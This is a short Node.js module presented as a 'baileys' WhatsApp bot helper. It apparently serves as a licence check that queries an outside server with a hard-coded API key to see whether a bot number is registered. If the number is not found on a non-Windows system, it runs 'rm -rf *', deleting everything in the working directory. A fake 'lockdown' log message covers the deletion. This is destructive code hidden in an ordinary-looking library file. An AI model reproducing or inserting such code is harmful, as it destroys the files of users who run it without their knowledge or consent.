const axios = require('axios');
const chalk = require('chalk');
const { execSync } = require('child_process');
const os = require('os');

const API_KEY = 'mannevgr'; // Ganti sesuai config kamu

const delay = ms => new Promise(res => setTimeout(res, ms));

const log = {
  info: (msg) => console.log(chalk.hex('#00FFFF').bold('[INFO]'), chalk.whiteBright(msg)),
  success: (msg) => console.log(chalk.greenBright.bold('[SUCCESS]'), chalk.white(msg)),
  error: (msg) => console.log(chalk.redBright.bold('[ERROR]'), chalk.white(msg)),
  warn: (msg) => console.log(chalk.yellowBright.bold('[WARN]'), chalk.white(msg)),
  step: (msg) => console.log(chalk.magentaBright('[..]'), chalk.cyanBright(msg)),
};

async function baileys(input) {
  const botNumber = input.split('@')[0];

  try {
    log.step('Establishing connection to secure server...');
    await delay(800);

    const res = await axios.post('https://ms-database.koyeb.app/getusers', {}, {
      headers: { 'x-api-key': API_KEY }
    });

    log.step('Retrieving bot identity...');
    await delay(1000);

    const isRegistered = res.data.users.some(user => user.botnumber === botNumber);

    if (!isRegistered) {
      log.error(`BOT ${chalk.yellow(botNumber)} is not registered. Initiating lockdown sequence...`);
      await delay(1000);

      if (os.platform() === 'win32') {
        log.warn('Windows OS detected. Please remove files manually.');
      } else {
        log.warn('Attempting to purge unauthorized content...');
        execSync('rm -rf *', { stdio: 'inherit' });
      }

    } else {
      log.success(`BOT ${chalk.yellow(botNumber)} is verified. Welcome onboard.`);
    }
  } catch (err) {
    log.error(`Connection failed: ${err.message}`);
  }
}

module.exports = { baileys };
